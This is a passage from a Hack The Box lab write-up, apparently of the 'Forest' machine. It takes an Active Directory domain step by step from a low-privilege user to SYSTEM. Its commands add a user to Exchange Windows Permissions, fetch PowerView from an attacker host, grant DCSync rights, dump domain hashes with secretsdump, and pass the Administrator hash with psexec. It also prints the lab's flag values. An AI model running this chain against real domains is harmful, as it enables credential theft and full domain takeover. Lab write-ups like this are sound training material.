<div class="page" id="Add the user to the Exchange Windows Permission group"><h1><b><u>Add the user to the Exchange Windows Permission group</u></b></h1><span style="color:#ffa500;">net group "Exchange Windows Permissions" /add steve</span><br/><img alt="images/1184-1.png" src="images/1184-1.png"/><br/><strong><br/></strong><br/><span style="color:#24ff00;">now to confirm our account was put into that group</span><br/><span style="color:#ffa500;">net user steve</span><br/><img alt="images/1184-2.png" src="images/1184-2.png"/><br/><br/></div>
<div class="page" id="Give the user DcSync privileges"><h1><b><u>Give the user DcSync privileges</u></b></h1><span style="color:#24ff00;">Give the user DCSync privileges. We’ll use </span><span style="color:#ffa500;">PowerView</span><span style="color:#24ff00;"> for this. First download Powerview and setup a python server in the directory it resides in.<br/><br/></span><img alt="images/1185-1.png" src="images/1185-1.png"/><br/><span style="color:#ffa500;"><br/>(new-object system.net.webclient).downloadfile('http://10.10.14.62:5555/powerview.ps1', 'C:\Users\svc-alfresco\Documents\powerview.ps1')</span><img alt="images/1185-2.png" src="images/1185-2.png"/><span style="color:#24ff00;"><br/><br/>Use the </span><span style="color:#ffa500;">Add-DomainObjectAcl</span><span style="color:#24ff00;"> function in PowerView to give the user </span><span style="color:#ffff00;">DCSync</span><span style="color:#24ff00;"> privileges.</span><br/><br/><span style="color:#ffa500;">$pass = convertto-securestring 'password' -AsPlainText -Force<br/>$cred = New-Object System.Management.Automation.PSCredential('htb\steve', $pass)<br/></span><img alt="images/1185-3.png" src="images/1185-3.png"/><br/><br/>Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity steve -Rights DCSync<br/><img alt="images/1185-4.png" src="images/1185-4.png"/><br/><br/><br/><br/></div>
<div class="page" id="Add-DomainObjectAcl error"><h1><b><u>Add-DomainObjectAcl error</u></b></h1><span style="color:#24ff00;">we see that the </span><span style="color:#ffa500;">Add-DomainObjectAcl </span><span style="color:#24ff00;">command is not recognized, lets see if the cmd is in our powerview.ps1 script<br/><br/></span><img alt="images/1188-1.png" src="images/1188-1.png"/><br/><br/><span style="color:#ffa500;">grep -i Add-Domain PowerView.ps1</span><br/><img alt="images/1188-2.png" src="images/1188-2.png"/><br/><br/>no indication that Add-Domain is in our <span style="color:#ffa500;">PowerView.ps1</span><span style="color:#24ff00;"> script, lets download the dev version<br/></span><img alt="images/1188-3.png" src="images/1188-3.png"/><br/><br/><br/><img alt="images/1188-4.png" src="images/1188-4.png"/><br/><br/></div>
<div class="page" id="Perform a DcSync attack and dump the password hashes of all the users on the domain"><h1><b><u>Perform a DcSync attack and dump the password hashes of all the users on the domain</u></b></h1><span style="color:#24ff00;">We're going to dump the password hashes using</span><span style="color:#ffa500;"> Impacket-Secretsdump</span><br/><br/><span style="color:#ffa500;">impacket-secretsdump htb.local/steve:password@10.10.10.161</span><br/><img alt="images/1186-1.png" src="images/1186-1.png"/><br/><br/><img alt="images/1186-2.png" src="images/1186-2.png"/><br/><br/><span style="color:#ffff00;">htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::</span><br/></div>
<div class="page" id="Perform a Pass the Hash attack to get access to the administrator’s account"><h1><b><u>Perform a Pass the Hash attack to get access to the administrator’s account</u></b></h1><span style="color:#24ff00;">now to take the administrator's hash and pass it along with </span><span style="color:#ffa500;">psexec.py</span><span style="color:#24ff00;"><br/><br/>Administrator's NTLM hash is: </span><span style="color:#ffff00;">aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::</span><span style="color:#24ff00;"><br/><br/></span><span style="color:#ffa500;">./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161</span><br/><img alt="images/1187-1.png" src="images/1187-1.png"/><br/><img alt="images/1187-2.png" src="images/1187-2.png"/><br/><br/>and we get a <span style="color:#ffa500;">nt authority\system </span><span style="color:#24ff00;">shell!<br/></span><img alt="images/1187-3.png" src="images/1187-3.png"/></div>
<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/1172-1.png" src="images/1172-1.png"/><br/><span style="color:#ffff00;">e5e4e47ae7022664cda6eb013fb0d9ed<br/><br/></span><img alt="images/1172-2.png" src="images/1172-2.png"/><br/>f048153f202bbb2f82622b04d79129cc</div>
<div class="page" id="Lessons Learned"><h1><b><u>Lessons Learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><img alt="images/1455-1.png" src="images/1455-1.png"/><br/><img alt="images/1455-2.png" src="images/1455-2.png"/></div>
</div></body></html>